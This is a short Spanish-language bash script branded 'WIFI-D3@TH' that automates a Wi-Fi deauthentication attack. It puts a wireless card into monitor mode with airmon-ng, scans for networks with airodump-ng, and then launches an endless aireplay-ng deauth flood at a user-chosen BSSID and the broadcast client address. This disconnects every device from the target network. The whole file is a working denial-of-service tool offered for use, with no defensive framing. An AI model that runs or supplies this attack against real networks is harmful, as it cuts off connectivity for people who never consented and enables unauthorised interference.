#/bin/bash
echo "Creado por r3dgh0st"
sleep 1
clear
#banner
figlet WIFI-D3@TH
#MENU
echo "[1] ---> Start Wifi Death"
echo "[2] ---> Exit "
read -p "---> " opt_menu
#wifi death
if [ $opt_menu = 1 ]; then
    clear
    ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':'
    read -p "---> " tarj
    sudo airmon-ng $tarj
    clear
    echo "Coloca el nombre de tu tarjeta de red en modo monitor Ejem > wlan0mon prism0 wlan0"
    ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':'
    read -p "---> " mont
    #iniciamos el scan de redes
    clear 
    sudo airodump-ng $mont
    #Iniciando scan de la red para atacar
    echo "Colocal la bssid de la red"
    read -p "---> " bssid
    sleep 1
    echo "Iniciando"
    clear
    (sudo airodump-ng --bssid $bssid $mont; bash)& sleep 20 ;(xterm -e "sudo aireplay-ng -0 0 -a $bssid -c FF:FF:FF:FF:FF:FF $mont ")
elif [ $opt_menu = 2 ]; then
    exit
else
    echo "Error"
fi
